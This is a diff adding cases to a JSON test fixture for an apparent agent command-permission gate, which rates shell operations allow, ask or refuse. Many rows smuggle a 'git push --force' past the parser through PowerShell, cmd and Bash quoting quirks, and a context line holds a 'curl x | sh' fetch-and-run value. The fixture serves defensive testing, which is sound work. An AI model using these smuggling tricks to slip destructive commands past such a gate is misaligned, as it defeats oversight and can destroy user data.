@@ -978,5 +978,302 @@
     "operation": "git config core.fsmonitor 'curl x | sh'",
     "expected": "ask",
     "class": "by-design"
+  },
+  {
+    "operation": "git status && git push --force origin main",
+    "expected": "refuse",
+    "class": "by-design"
+  },
+  {
+    "operation": "ls && frobnicate --now",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls ; frobnicate --now",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls\nfrobnicate --now",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls & frobnicate --now",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls || frobnicate --now",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "cat x | frobnicate",
+    "expected": "allow",
+    "class": "by-design"
+  },
+  {
+    "operation": "ls ; ./frobnicate.sh",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && \"frobnicate\"",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && FOO=1 frobnicate",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && time ./frobnicate.sh",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && time -p ./frobnicate.sh",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && do frobnicate",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && FOO=1 time ./frobnicate.sh",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && do time ./frobnicate.sh",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "ls && if true; then time ./frobnicate.sh; fi",
+    "expected": "ask",
+    "class": "by-design",
+    "note": "unknown head after a separator, prefix, env assignment or shell keyword asks, as a bare unknown head does (fix(gate) 2026-09-17: unknown head resolved past env prefixes and prefix runners)"
+  },
+  {
+    "operation": "git commit -m \"apply pending changes\"",
+    "expected": "ask",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "R-2 one-parse-view pin: same operation as the next row, carried by the Bash tool name"
+  },
+  {
+    "operation": "git commit -m \"apply pending changes\"",
+    "expected": "ask",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "R-2 one-parse-view pin: same operation as the previous row, carried by the PowerShell tool name; both must reach the same decision"
+  },
+  {
+    "operation": "git commit -m x",
+    "expected": "ask",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: the plan's Bash half of the pair; the next row carries the same text by PowerShell and must reach the same decision"
+  },
+  {
+    "operation": "git commit -m x",
+    "expected": "ask",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: the plan's PowerShell half of the pair; same text and decision as the previous row"
+  },
+  {
+    "operation": "Get-Content \"C:\\dir\\\"; git push --force origin main",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: under PowerShell a backslash is literal, so the string closes and the force-push runs; read with Bash's rules the escaped quote hid the push and the line was allowed"
+  },
+  {
+    "operation": "cat \"a\\\"; git push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: same literal-backslash case with a fast-floor read head; the fast gate allowed it without escalating"
+  },
+  {
+    "operation": "cat @'\na'\"\n'@; git push --force; cat \"x\"",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a PowerShell here-string holds quotes literally; read with Bash's rules its quotes swallowed the push"
+  },
+  {
+    "operation": "cat \"a\u201c; git push --force; cat \u201dx\"",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: PowerShell closes a double-quoted string on a typographic quote; Bash does not, which hid the push"
+  },
+  {
+    "operation": "Write-Host \"done`n\"",
+    "expected": "allow",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: the backtick is PowerShell's escape character, not a command substitution; this was asked about as an unclosed substitution"
+  },
+  {
+    "operation": "git log --format=\"%h `\"x`\"\"",
+    "expected": "allow",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: backtick-escaped quotes inside a PowerShell string; this was asked about as an opaque payload"
+  },
+  {
+    "operation": "echo 'a & git push --force'",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "cmd",
+    "note": "G-5 synthetic dialect pin: cmd.exe has no single-quoted strings, so the ampersand separates and the push runs; read with Bash's rules it was one quoted echo"
+  },
+  {
+    "operation": "echo x@'\ny'@; git push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a here-string opens only at the start of a token; `x@'` is a word and an ordinary string, so the push runs (review fix B1)"
+  },
+  {
+    "operation": "echo x@\"\ny\"@; git push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: the double-quoted form of the mid-token here-string opener (review fix B1)"
+  },
+  {
+    "operation": "ls # don't\ngit push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quote inside a comment must not swallow the next line; PowerShell runs the push, and the fast path must escalate (review fix H1)"
+  },
+  {
+    "operation": "ls <# ' #> ; git push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quote inside a block comment; PowerShell runs the push (review fix H1)"
+  },
+  {
+    "operation": "ls # don't\ngit push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: Bash also reads `#` at a word start as a comment to the end of the line, so the quote in it is inert and the push runs (review fix H1)"
+  },
+  {
+    "operation": "'git' push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "'git' push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "\"git\" push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "\"git\" push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "& 'git' push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "& 'git' push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "&\"git\" push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "&\"git\" push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quoted command name is still that command; the head is read from the parse view's resolved argv (review fix H2-parse)"
+  },
+  {
+    "operation": "$x=@'\nit's fine\n'@; Write-Host $x",
+    "expected": "allow",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a here-string opens after `=` too; its body's quote is literal (review round 2, F1)"
+  },
+  {
+    "operation": "'/usr/bin/git' push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: a quoted path to a command is still that command; the head resolves to its base name (review round 2, F3)"
+  },
+  {
+    "operation": "'/usr/bin/git' push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quoted path to a command is still that command; the head resolves to its base name (review round 2, F3)"
+  },
+  {
+    "operation": "& \"C:/Program Files/git.exe\" push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "Bash",
+    "note": "G-5 synthetic dialect pin: a quoted path to a command is still that command; the head resolves to its base name (review round 2, F3)"
+  },
+  {
+    "operation": "& \"C:/Program Files/git.exe\" push --force",
+    "expected": "refuse",
+    "class": "by-design",
+    "tool": "PowerShell",
+    "note": "G-5 synthetic dialect pin: a quoted path to a command is still that command; the head resolves to its base name (review round 2, F3)"
   }
 ]
